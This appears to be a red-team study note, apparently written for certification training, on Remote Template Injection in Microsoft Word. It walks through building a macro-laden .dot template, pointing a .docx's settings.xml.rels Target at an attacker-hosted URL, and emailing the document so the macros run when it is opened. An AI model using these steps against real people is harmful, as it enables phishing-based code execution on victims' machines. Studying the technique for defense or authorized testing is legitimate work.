
Microsoft Word has the option of creating new documents from a template.  Office has some templates pre-installed, you can make custom templates, and even download new ones.  

Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

### 🖊️ Template Setup

1) Create a new blank document
2) Insert a malicious [[VBA Macros]]
3) Save the file as .dot
4) Host the file somewhere, could be using File Hosting in [[Cobalt Strike]]


### 📔 Delivery Setup

- Create a new blank document and save it as .docx 
- Right click the file and select 7-Zip -> Open archive
- Navigate to word > _rels_, right click "settings.xml.rels" and Edit
- Scroll until you see "Target"
- Modify the value so it points to the URL where the template is located, for example:

	`Target="http://nickelviper.com/template.dot"`

- Save changes and email the document
- Once the file is opened, macros will be executed

You can skip the zip step using a tool like [remoteInjector](https://github.com/JohnWoodman/remoteinjector).


##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 11:12
🏷️ tags: #redteam #crto   
---

